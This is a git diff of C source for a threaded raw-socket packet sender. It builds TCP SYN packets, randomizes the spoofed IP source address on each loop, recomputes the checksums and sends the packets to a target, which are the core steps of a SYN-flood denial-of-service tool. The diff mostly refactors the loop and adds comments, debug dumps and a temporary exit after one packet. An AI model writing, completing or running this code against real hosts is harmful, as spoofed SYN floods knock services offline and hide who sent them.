@@ -15,6 +15,7 @@ void *thread_handler(void *arg){
     IP_Header_t *iphead = (IP_Header_t *) malloc(sizeof(IP_Header_t));
     TCP_Header_t *tcphead = (TCP_Header_t *) malloc(sizeof(TCP_Header_t));
 
+    // convert ip from string to binary
     struct sockaddr_in dest_addr;
     dest_addr.sin_family = AF_INET;
     dest_addr.sin_port = htons(port);
@@ -30,10 +31,14 @@ void *thread_handler(void *arg){
     // initialize rng
     srand(*((uint32_t*) arg));
 
+    // serialize 
     byte *ip_stream = serialize_ip_header(iphead);
     byte *tcp_stream = serialize_tcp_header(tcphead);
 
+    // combined serialized segments to form serialized packet
     byte *syn = form_packet(ip_stream, tcp_stream);
+
+    // debugging information
     printf("\n");
     bin_dump(syn, syn_len, LITTLE_ENDIAN);
     printf("\n");
@@ -41,11 +46,22 @@ void *thread_handler(void *arg){
     printf("\nPacket length: %lu\n\n", syn_len);
 
     while(1){
-        // calculate random source address and update
+        // get random number
         uint32_t randnum = rand();
-        randomize_src(iphead, randnum);
+
+        // randomize source address
+        IP_set_src_address(iphead, get_random_src_address(randnum));
+
         // update checksums
-        update_checksums(syn);
+        IP_update_checksum(iphead);
+        TCP_update_checksum(tcphead, iphead);
+
+        // serialize
+        byte *ip_stream = serialize_ip_header(iphead);
+        byte *tcp_stream = serialize_tcp_header(tcphead);
+            // combined serialized segments to form serialized packet
+        byte *syn = form_packet(ip_stream, tcp_stream);
+
         // send packet
         if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
             perror("sendto error");
@@ -53,6 +69,9 @@ void *thread_handler(void *arg){
         }else{
             printf("Sent successfully\n");
         }
+        /* FOR TESTING ONLY */
+        close(sd);
+        exit(EXIT_SUCCESS);
         sleep(1);
     }
 
